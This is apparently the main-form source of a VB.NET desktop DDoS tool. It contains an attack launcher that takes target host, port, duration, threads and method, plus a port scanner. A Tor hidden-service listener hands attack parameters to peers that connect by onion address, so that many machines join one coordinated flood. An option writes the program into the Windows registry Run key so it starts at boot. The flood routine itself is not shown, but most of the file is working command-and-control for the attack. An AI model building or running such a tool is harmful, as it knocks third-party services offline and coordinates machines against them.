Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.Threading
Public Class Mainmenu
    Private attackb As Boolean = False
    Private activepanel As Panel
    Private receivingThread As Thread
    'Tcp
    Dim TCPPort As Integer = 5558
    Dim Listener As New TcpListener(TCPPort)
    Dim Client As New TcpClient
    Dim portscanmethod As String
    Private onionaddressLista As ArrayList
    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles exit_btn.Click
        For Each P As Process In System.Diagnostics.Process.GetProcessesByName("tor")
            P.Kill()
        Next
        Me.Close()
    End Sub
    Private Sub PictureBox1_MouseEnter(sender As Object, e As EventArgs) Handles exit_btn.MouseEnter
        exit_btn.Image = My.Resources.Letter_X_PNG_Photo2
    End Sub
    Private Sub PictureBox1_MouseLeave(sender As Object, e As EventArgs) Handles exit_btn.MouseLeave
        exit_btn.Image = My.Resources.Letter_X_PNG_Photo
    End Sub
    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles minimalize_btn.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub
    Private Sub PictureBox2_MouseEnte(sender As Object, e As EventArgs) Handles minimalize_btn.MouseEnter
        minimalize_btn.Image = My.Resources.minimalizewhite
    End Sub
    Private Sub PictureBox2_MouseEnter(sender As Object, e As EventArgs) Handles minimalize_btn.MouseLeave
        minimalize_btn.Image = My.Resources.minimalizeblack
    End Sub

    Public Sub changeStatus(ByVal input As String)
        status.Text = input
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        MessageTextbox.Text = RandomMessage()
        animation_show(Home_panel)
        Name_textbox.Text = getValue("Name=")
        Me.FormBorderStyle = getValue("borderStyle=")
        onionAddress_textbox.Text = readfile("hostname")
        Dim backgroundColor As Color = System.Drawing.Color.FromName(getValue("Color=").Replace("Color [", "").Replace("]", ""))

        colorchange(backgroundColor)

    End Sub
    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        For Each P As Process In System.Diagnostics.Process.GetProcessesByName("tor")
            P.Kill()
        Next
    End Sub
    Private Function RandomMessage()
        Dim rnd As Random = New Random
        Dim list As String() = {"Holy Shiiit!", "Holy hand grenade...", "subscribe to pewdiepie", "open your mouth, go for the squib", "chickens on the knees, God here", "Ah Shit, Here We Go Again", "sapnu puas"}
        Return list(rnd.Next(0, list.Length - 1))
    End Function
    Private Function readfile(ByVal filepath As String)
        Dim fileReader As String
        fileReader = My.Computer.FileSystem.ReadAllText(filepath)
        Return fileReader
    End Function
    Private Sub deleteFile(ByVal filepath As String)
        If System.IO.File.Exists(filepath) Then
            System.IO.File.Delete(filepath)
        End If
    End Sub
    Private Sub StartAttack_btn_Click(sender As Object, e As EventArgs) Handles StartAttack_btn.Click
        If attackb = False Then
            If HostTextbox.Text = "" Then
                Errormessage.Show()
            ElseIf PortTextbox.Text = "" Then
                Errormessage.Show()
            ElseIf timeofattackTextbox.Text = "" Then
                Errormessage.Show()
            ElseIf ThreadTextbox.Text = "" Then
                Errormessage.Show()
            ElseIf MessageTextbox.Text = "" Then
                Errormessage.Show()
            ElseIf methods.Text = "" Then
                Errormessage.Show()
            Else
                attack.startattack(HostTextbox.Text, PortTextbox.Text, timeofattackTextbox.Text, ThreadTextbox.Text, MessageTextbox.Text, methods.Text)
                StartAttack_btn.BackColor = Color.DarkRed
                StartAttack_btn.Text = "Stop"
                attackb = True
            End If
        Else
            StartAttack_btn.BackColor = Color.LightSeaGreen
            StartAttack_btn.Text = "Start"
            attackb = False
        End If

    End Sub
    Private Sub colorchange(ByVal backgroundColor As Color)
        title_panel.BackColor = backgroundColor
        Title.BackColor = backgroundColor
        status_title.BackColor = backgroundColor
        status.BackColor = backgroundColor
        minimalize_btn.BackColor = backgroundColor
        exit_btn.BackColor = backgroundColor
        StartAttack_btn.BackColor = backgroundColor
        color_btn.BackColor = backgroundColor
        connectserver_btn.BackColor = backgroundColor
        copyto_clipboard_btn.BackColor = backgroundColor
        hostchecker_btn.BackColor = backgroundColor
        newOnionaddress_btn.BackColor = backgroundColor
        saveSetting_btn.BackColor = backgroundColor
        Scan_port_btn.BackColor = backgroundColor
        StartServer_btn.BackColor = backgroundColor
    End Sub
    Private Sub TrackBar1_Scroll(sender As Object, e As EventArgs) Handles TrackBar1.Scroll
        ThreadTextbox.Text = TrackBar1.Value
    End Sub
    'Menu_btn
    Private Sub Attack_btn_Click(sender As Object, e As EventArgs) Handles Attack_btn.Click
        animation_hide()
        animation_show(Attack_panel)
    End Sub

    Private Sub Home_btn_Click(sender As Object, e As EventArgs) Handles Home_btn.Click
        animation_hide()
        animation_show(Home_panel)
    End Sub
    Private Sub statics_btn_Click(sender As Object, e As EventArgs) Handles statics_btn.Click
        animation_hide()
        animation_show(Statics_panel)
    End Sub
    Private Sub tools_btn_Click(sender As Object, e As EventArgs) Handles tools_btn.Click
        animation_hide()
        animation_show(Tools_panel)
    End Sub
    Private Sub settings_btn_Click(sender As Object, e As EventArgs) Handles settings_btn.Click
        animation_hide()
        animation_show(Settings_panel)
    End Sub
    Private Sub irc_btn_Click(sender As Object, e As EventArgs) Handles irc_btn.Click
        animation_hide()
        animation_show(ddos_panel)
    End Sub
    'menu_subs
    Private Sub animation_show(ByVal panel)
        While (True)
            panel.width += 5
            If Me.Width < panel.width Then
                activepanel = panel
                Exit While
            End If
        End While
    End Sub
    Private Sub animation_hide()
        While (True)
            activepanel.Width -= 1
            If 1 > activepanel.Width Then
                Exit While
            End If
        End While
    End Sub
    'Tools
    Private Sub Scan_port_btn_Click(sender As Object, e As EventArgs) Handles Scan_port_btn.Click
        portscanmethod = Port_method.Text
        newPortThreads()
    End Sub
    Private Sub PortScanner()
        If Not Port_host_textbox.Text = "" Then
            Dim lowport As Integer = Min_port.Text
            Dim highport As Integer = Max_port.Text

            MsgBox("Port scanning started!")
            portscannerobj.Text = "Port scanning: " & Port_host_textbox.Text
            portscannerobj.Show()
            portscannerobj.portscan(Port_host_textbox.Text, lowport, highport, portscanmethod)
        Else
            MsgBox("Host textbox is empty!")
        End If
    End Sub
    'threads
    Private Sub newPortThreads()
        Dim start As ThreadStart = New ThreadStart(AddressOf PortScanner)
        receivingThread = New Thread(start)
        receivingThread.IsBackground = True
        receivingThread.Start()
    End Sub
    'subs settings
    Private Sub hostchecker_btn_Click(sender As Object, e As EventArgs) Handles hostchecker_btn.Click
        Try
            Dim webclient As New WebClient
            Dim reply = webclient.DownloadString("https://downforeveryoneorjustme.com/" & Hostcheck_textbox.Text)
            Dim webcheck As Boolean = reply.IndexOf("It's just you.")
            If Not Hostcheck_textbox.Text = "" Then
                If webcheck = False Then
                    MsgBox("It's not just you!")
                Else
                    MsgBox("It's just you.")
                End If
            Else
                MsgBox("Host input empty")
            End If

        Catch
            MsgBox("invalid URL")
        End Try
    End Sub

    Private Sub Border_style_comboboxChanged(sender As Object, e As EventArgs) Handles Border_style_combobox.SelectedIndexChanged
        If Border_style_combobox.Text = "Fixed3D" Then
            Me.FormBorderStyle = 1
            SaveSettings("borderStyle=", "1")
        ElseIf Border_style_combobox.Text = "None" Then
            Me.FormBorderStyle = 0
            SaveSettings("borderStyle=", "0")
        End If

    End Sub
    Private Sub createSetting()
        Dim filename As String = "setting.ini"
        Dim newcontent As String =
"Name=#" & randomString() & vbNewLine &
"borderStyle=0" & vbNewLine &
"Color=LightSeaGreen"

        Dim file As System.IO.StreamWriter
        file = My.Computer.FileSystem.OpenTextFileWriter(filename, True)
        file.Write(newcontent)
        file.Close()
    End Sub
    Private Sub SaveSettings(ByVal arg As String, ByVal value As String)
        Dim filename As String = "setting.ini"
        Dim saveString As String = ""
        If Not System.IO.File.Exists(filename) Then
            createSetting()
        End If

        Dim fileReader As String
        fileReader = My.Computer.FileSystem.ReadAllText(filename)
        saveString = fileReader.Replace(getFileLine(arg), arg & value)
        My.Computer.FileSystem.DeleteFile(filename)
        Dim file As System.IO.StreamWriter
        file = My.Computer.FileSystem.OpenTextFileWriter(filename, True)
        file.Write(saveString)
        file.Close()
    End Sub
    Private Function randomString()
        Dim s As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        Dim r As New Random
        Dim sb As New StringBuilder
        For i As Integer = 1 To 8
            Dim idx As Integer = r.Next(0, 35)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function
    Private Function getValue(ByVal arg As String)
        Dim filename As String = "setting.ini"
        Dim textline As String
        If Not System.IO.File.Exists(filename) Then
            createSetting()
        End If
        Dim objReader As New System.IO.StreamReader(filename)
        'Dim objWriter As New System.IO.StreamWriter(filename)
        Do While objReader.Peek() <> -1
            textline = objReader.ReadLine()
            If Not textline.IndexOf(arg) Then
                objReader.Close()
                Return textline.Replace(arg, "")
            End If
        Loop
        objReader.Close()
        Return ""
    End Function
    Private Function getFileLine(ByVal arg As String)
        Dim filename As String = "setting.ini"
        Dim textline As String
        If Not System.IO.File.Exists(filename) Then
            createSetting()
        End If
        Dim objReader As New System.IO.StreamReader(filename)
        'Dim objWriter As New System.IO.StreamWriter(filename)
        Do While objReader.Peek() <> -1
            textline = objReader.ReadLine()
            If Not textline.IndexOf(arg) Then
                objReader.Close()
                Return textline
            End If
        Loop
        objReader.Close()
        Return ""
    End Function

    Private Sub Name_textbox_TextChanged(sender As Object, e As EventArgs) Handles saveSetting_btn.Click
        SaveSettings("Name=", Name_textbox.Text)
    End Sub
    Private Sub color_btn_Click(sender As Object, e As EventArgs) Handles color_btn.Click
        If ColorDialog1.ShowDialog() = DialogResult.OK Then
            SaveSettings("Color=", ColorDialog1.Color.ToString)
            colorchange(ColorDialog1.Color)
        End If
    End Sub
    'DDos panel subs


    Private Sub copyto_clipboard__btn_Click(sender As Object, e As EventArgs) Handles copyto_clipboard_btn.Click
        Clipboard.SetText(onionAddress_textbox.Text)
        changeStatus("Address copied!")
    End Sub

    Private Sub newOnionaddress_btn_Click(sender As Object, e As EventArgs) Handles newOnionaddress_btn.Click
        deleteFile("hostname")
        deleteFile("private_key")
        changeStatus("Restart Tor...")
        For Each P As Process In System.Diagnostics.Process.GetProcessesByName("tor")
            P.Kill()
        Next
        Loading.proccessstart()
        Thread.Sleep(6000)
        onionAddress_textbox.Text = readfile("hostname")
    End Sub

    Private Sub StartServer_btn_Click(sender As Object, e As EventArgs) Handles StartServer_btn.Click
        If (getHost() <> "") And (getPort() <> Nothing) And (getthread() <> Nothing) And (getTime() <> Nothing) And (getFunnymessage() <> "") Then
            TCP_Timer.Start()
        Else
            animation_hide()
            animation_show(Attack_panel)
            MsgBox("Please start attack!")
        End If
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles windows_start_chck.CheckedChanged
        If windows_start_chck.Checked = True Then
            My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
        Else
            My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
        End If
    End Sub
    Private Function filereader(ByVal file As String)
        Return My.Computer.FileSystem.ReadAllText(file,
   System.Text.Encoding.UTF8)
    End Function
    Private Sub TCP_Timer_Tick(sender As Object, e As EventArgs) Handles TCP_Timer.Tick
        Try
            Listener.Start()
            Dim message As String
            If Listener.Pending = True Then
                message = ""

                Client = Listener.AcceptTcpClient()
                Dim Reader As New StreamReader(Client.GetStream())
                While Reader.Peek > -1
                    message = message + Convert.ToChar(Reader.Read()).ToString
                End While
                Dim msg As String() = message.Split(New Char() {" "c})
                If msg(1) = "/" Then
                    HttpStreamWriter(filereader("/index.html"), Client)
                ElseIf msg(0) = "/attack" Then
                    StreamWriter(getHost() & " " & getPort() & " " & getTime() & " " & getthread() & " " & getFunnymessage(), Client)
                    If Not onionaddressLista.IndexOf(msg(1)) Then
                        onionaddressLista.Add(msg(1))
                    End If
                ElseIf msg(0) = "/chat" Then
                    chat.Items.Add(msg(1) & ": " & msg(2).Replace("$", " "))
                    Try
                        For i = 0 To onionaddressLista.Count
                            HttpPost(onionaddressLista(i), "/chat " & Name_textbox.Text & " " & msg(2).Replace(" ", "$"))
                        Next
                    Catch ex As Exception
                        Console.WriteLine("Chat error")
                    End Try
                End If
            End If
        Catch
        End Try
    End Sub
    Private Sub HttpStreamWriter(ByVal msg As String, ByVal Client As TcpClient)
        Dim Writer = New StreamWriter(Client.GetStream())
        Dim str As String = "HTTP/1.1 200 OK
Date: " & DateTime.UtcNow & "
Server: Apache/2.2.14 (Win32)
Last-Modified: Wed, 22 Jul 2009 19:15:56 GMT
Content-Length: " & msg.Length & "
Content-Type: text/html
Connection: Closed

"
        Writer.Write(str)
        Writer.Write(msg)
        Writer.Flush()
        Client.Close()
    End Sub
    Private Sub StreamWriter(ByVal msg As String, ByVal Client As TcpClient)
        Dim Writer = New StreamWriter(Client.GetStream())
        Writer.Write(msg)
        Writer.Flush()
        Client.Close()
    End Sub

    Private Sub connectserver_btn_Click(sender As Object, e As EventArgs) Handles connectserver_btn.Click
        Dim response As String = HttpPost(Connect_address_textbox.Text, "/attack " & onionAddress_textbox.Text)
        Dim msg As String() = response.Split(New Char() {" "c})
        startattack(msg(0), msg(1), msg(2), msg(3), msg(4), msg(5))
        TCP_Timer.Start()
    End Sub
    Private Sub length_chchbox_CheckedChanged(sender As Object, e As EventArgs) Handles length_chchbox.CheckedChanged
        If Me.length_chchbox.Checked Then
            Label6.Text = "Length"
            MessageTextbox.Text = "1024"
        Else
            Label6.Text = "Message"
            MessageTextbox.Text = RandomMessage()
        End If
    End Sub

    Private Sub MsgtoChat_textbox_TextChanged(sender As Object, e As System.Windows.Forms.KeyEventArgs) Handles MsgtoChat_textbox.KeyDown
        If e.KeyCode = Keys.Enter Then
            HttpPost(Connect_address_textbox.Text, "/chat " & Name_textbox.Text & " " & MsgtoChat_textbox.Text.Replace(" ", "$"))
        End If

    End Sub
End Class